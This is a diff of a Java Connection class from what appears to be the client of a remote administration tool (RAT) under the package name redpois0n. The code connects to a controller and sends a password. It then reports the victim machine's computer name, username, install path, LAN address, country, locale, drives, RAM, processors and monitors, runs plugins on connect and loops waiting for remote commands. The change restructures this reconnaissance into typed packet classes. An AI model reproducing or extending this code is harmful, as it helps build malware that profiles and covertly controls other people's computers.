@@ -1,29 +1,40 @@
 package com.redpois0n;
 
-import java.awt.GraphicsDevice;
 import java.awt.GraphicsEnvironment;
-import java.awt.Rectangle;
-import java.io.BufferedReader;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.InputStream;
-import java.io.InputStreamReader;
 import java.io.OutputStream;
-import java.io.PrintWriter;
 import java.lang.management.ManagementFactory;
 import java.net.InetAddress;
 import java.net.Socket;
 import java.util.Locale;
-import java.util.Random;
 
 import com.redpois0n.common.OperatingSystem;
 import com.redpois0n.common.Version;
 import com.redpois0n.common.codec.Hex;
 import com.redpois0n.common.crypto.Crypto;
+import com.redpois0n.common.io.StringWriter;
 import com.redpois0n.packets.incoming.AbstractIncomingPacket;
 import com.redpois0n.packets.incoming.PacketBuilder;
+import com.redpois0n.packets.outgoing.AbstractOutgoingPacket;
 import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.packets.outgoing.Packet10InitDefaultLocale;
+import com.redpois0n.packets.outgoing.Packet14InitComputerName;
+import com.redpois0n.packets.outgoing.Packet15InitServerID;
+import com.redpois0n.packets.outgoing.Packet16InitOperatingSystem;
+import com.redpois0n.packets.outgoing.Packet1InitPassword;
+import com.redpois0n.packets.outgoing.Packet22InitUsername;
+import com.redpois0n.packets.outgoing.Packet23InitInstallPath;
+import com.redpois0n.packets.outgoing.Packet25InitJavaVersion;
+import com.redpois0n.packets.outgoing.Packet26InitJavaPath;
+import com.redpois0n.packets.outgoing.Packet28InitLanAddress;
+import com.redpois0n.packets.outgoing.Packet30InitVersion;
+import com.redpois0n.packets.outgoing.Packet31InitInstallationDate;
+import com.redpois0n.packets.outgoing.Packet47InitCountry;
+import com.redpois0n.packets.outgoing.Packet63InitRAM;
+import com.redpois0n.packets.outgoing.Packet64InitAvailableProcessors;
 import com.sun.management.OperatingSystemMXBean;
 
 public class Connection implements Runnable {
@@ -39,9 +50,13 @@ public class Connection implements Runnable {
 
 	public static DataInputStream dis;
 	public static DataOutputStream dos;
-	
-	public static BufferedReader br;
-	public static PrintWriter pw;
+
+	public static StringWriter sw = new StringWriter() {
+		@Override
+		public void writeLine(String s) throws Exception {
+			Connection.writeLine(s);
+		}
+	};
 
 	public Connection() {
 
@@ -59,31 +74,10 @@ public class Connection implements Runnable {
 
 			Connection.dis = new DataInputStream(inputStream);
 			Connection.dos = new DataOutputStream(outputStream);
-			
-			br = new BufferedReader(new InputStreamReader(dis));
-			pw = new PrintWriter(dos, true);		
-			
+
 			Main.encryption = inputStream.read() == 1;
-			
-			System.out.println("Read int: " + readInt());
-			System.out.println("Read long: " + readLong());
-			System.out.println("Read short: " + readShort());
-			
-			int i = (new Random()).nextInt();
-			long l = (new Random()).nextInt();
-			short s = (short) (new Random()).nextInt(1000);
 
-			
-			System.out.println("Write int: " + i);
-			System.out.println("Write long: " + l);
-			System.out.println("Write short: " + s);
-			
-			writeInt(i);
-			writeLong(l);
-			writeShort(s);
-
-			
-			addToSendQueue(new PacketBuilder(Header.INIT_PASSWORD, Main.getPass()));		
+			addToSendQueue(new Packet1InitPassword(Main.getPass()));
 
 			initialize();
 
@@ -92,10 +86,10 @@ public class Connection implements Runnable {
 			for (Plugin plugin : Plugin.list) {
 				plugin.methods.get("onconnect").invoke(plugin.instance, new Object[] { dis, dos });
 			}
-			
+
 			while (true) {
 				byte line = readByte();
-				
+
 				if (line == 0) {
 					Connection.writeByte(0);
 					continue;
@@ -110,14 +104,14 @@ public class Connection implements Runnable {
 				new Thread(this).start();
 			} catch (Exception e) {
 				e.printStackTrace();
-			}		
+			}
 		}
 	}
 
 	public static void initialize() throws Exception {
-		addToSendQueue(new PacketBuilder(Header.INIT_DATE, Main.date));
+		addToSendQueue(new Packet31InitInstallationDate(Main.date));
 
-		addToSendQueue(new PacketBuilder(Header.INIT_VERSION, Version.getVersion()));
+		addToSendQueue(new Packet30InitVersion(Version.getVersion()));
 
 		String computerName;
 		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
@@ -125,19 +119,19 @@ public class Connection implements Runnable {
 		} else {
 			computerName = System.getProperty("user.name");
 		}
-		addToSendQueue(new PacketBuilder(Header.INIT_COMPUTER_NAME, computerName));
+		addToSendQueue(new Packet14InitComputerName(computerName));
 
-		addToSendQueue(new PacketBuilder(Header.INIT_OS_NAME, System.getProperty("os.name")));
+		addToSendQueue(new Packet16InitOperatingSystem(System.getProperty("os.name")));
 
-		addToSendQueue(new PacketBuilder(Header.INIT_SERVER_ID, Main.getID()));
+		addToSendQueue(new Packet15InitServerID(Main.getID()));
 
-		addToSendQueue(new PacketBuilder(Header.INIT_USERNAME, System.getProperty("user.name")));
+		addToSendQueue(new Packet22InitUsername(System.getProperty("user.name")));
 
-		addToSendQueue(new PacketBuilder(Header.INIT_SERVER_PATH, Main.class.getProtectionDomain().getCodeSource().getLocation().getPath()));
+		addToSendQueue(new Packet23InitInstallPath(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath()));
 
-		addToSendQueue(new PacketBuilder(Header.INIT_JAVA_VERSION, System.getProperty("java.runtime.version")));
+		addToSendQueue(new Packet25InitJavaVersion(System.getProperty("java.runtime.version")));
 
-		addToSendQueue(new PacketBuilder(Header.INIT_JAVA_PATH, System.getProperty("java.home")));
+		addToSendQueue(new Packet26InitJavaPath(System.getProperty("java.home")));
 
 		String localip;
 		try {
@@ -145,41 +139,30 @@ public class Connection implements Runnable {
 		} catch (Exception e) {
 			localip = "Unknown";
 		}
-		addToSendQueue(new PacketBuilder(Header.INIT_LOCAL_IP, localip));
+		addToSendQueue(new Packet28InitLanAddress(localip));
 
-		addToSendQueue(new PacketBuilder(Header.INIT_COUNTRY, System.getProperty("user.country")));
+		addToSendQueue(new Packet47InitCountry(System.getProperty("user.country")));
 
-		Locale locale = Locale.getDefault();
-		addToSendQueue(new PacketBuilder(Header.INIT_LOCALE, new String[] { locale.getDisplayLanguage(), locale.getLanguage(), locale.getDisplayCountry() }));
+		addToSendQueue(new Packet10InitDefaultLocale(Locale.getDefault()));
 
-		PacketBuilder drives = new PacketBuilder(Header.INIT_DRIVES);
-		File[] roots = File.listRoots();
-		drives.add(roots.length);
-		for (File root : roots) {		
-			drives.add(root.getAbsolutePath());
-			drives.add(root.getTotalSpace() / 1024L / 1024L / 1024L);
-			drives.add(root.getFreeSpace() / 1024L / 1024L / 1024L);
-			drives.add(root.getUsableSpace() / 1024L / 1024L / 1024L);
-		}
-		addToSendQueue(drives);
+		addToSendQueue(new Packet62Drives(File.listRoots()));
 
-		addToSendQueue(new PacketBuilder(Header.INIT_RAM, (((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize() / 1024L / 1024L)));
+		addToSendQueue(new Packet63InitRAM((short) (((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize() / 1024L / 1024L)));
 
-		addToSendQueue(new PacketBuilder(Header.INIT_AVAILABLE_PROCESSORS, Runtime.getRuntime().availableProcessors()));
+		addToSendQueue(new Packet64InitAvailableProcessors(Runtime.getRuntime().availableProcessors()));
 
-		PacketBuilder monitor = new PacketBuilder(Header.INIT_MONITORS);
-		GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
-		GraphicsDevice[] screens = ge.getScreenDevices();
-		monitor.add(screens.length);
-		for (GraphicsDevice screen : screens) {
-			Rectangle screenBounds = screen.getDefaultConfiguration().getBounds();
-			String id = screen.getIDstring();
-			if (id.startsWith("\\")) {
-				id = id.substring(1, id.length());
+		addToSendQueue(new Packet61Monitors(GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()));
+	}
+
+	public static void addToSendQueue(AbstractOutgoingPacket packet) {
+		while (lock) {
+			try {
+				Thread.sleep(10L);
+			} catch (Exception ex) {
+				ex.printStackTrace();
 			}
-			monitor.add(id + ": " + screenBounds.width + "x" + screenBounds.height);
 		}
-		addToSendQueue(monitor);
+		packet.send(dos, sw);
 	}
 
 	public static void addToSendQueue(PacketBuilder packet) {
@@ -192,7 +175,7 @@ public class Connection implements Runnable {
 		}
 		packet.write();
 	}
-
+	
 	public static void write(Header header) {
 		addToSendQueue(new PacketBuilder(header));
 	}
@@ -202,13 +185,14 @@ public class Connection implements Runnable {
 			String enc = Crypto.encrypt(s, Main.getKey());
 			if (enc.contains("\n")) {
 				enc = "-h " + Hex.encode(s);
-			} if (s.startsWith("-c ")) {
+			}
+			if (s.startsWith("-c ")) {
 				enc = s;
 			} else if (!Main.encryption) {
 				enc = "-c " + s;
 			}
-			
-			//dos.writeUTF(enc);
+
+			// dos.writeUTF(enc);
 			dos.writeShort(enc.length());
 			dos.writeChars(enc);
 		} catch (Exception ex) {
@@ -218,16 +202,16 @@ public class Connection implements Runnable {
 
 	public static String readLine() {
 		try {
-			//String s = dis.readUTF();
+			// String s = dis.readUTF();
 			short len = dis.readShort();
-			
+
 			StringBuilder builder = new StringBuilder();
 			for (int i = 0; i < len; i++) {
 				builder.append(dis.readChar());
 			}
-			
+
 			String s = builder.toString();
-			
+
 			if (s.startsWith("-h ")) {
 				s = Hex.decode(s.substring(3, s.length()));
 			} else if (s.startsWith("-c ")) {
@@ -235,14 +219,14 @@ public class Connection implements Runnable {
 			} else {
 				s = Crypto.decrypt(s, Main.getKey());
 			}
-			
+
 			return s;
 		} catch (Exception e) {
 			e.printStackTrace();
 			return null;
 		}
 	}
-	
+
 	public static void writeShort(short i) throws Exception {
 		dos.writeShort(i);
 	}
@@ -288,11 +272,11 @@ public class Connection implements Runnable {
 	}
 
 	public static void status(String status) {
-		addToSendQueue(new PacketBuilder(Header.STAT, status));
+		// TODO addToSendQueue(new PacketBuilder(Header.STAT, status));
 	}
 
 	public static void status(int status) {
-		addToSendQueue(new PacketBuilder(Header.STAT, status + ""));
+		// TODO addToSendQueue(new PacketBuilder(Header.STAT, status + ""));
 	}
 
 	public static void lock() {
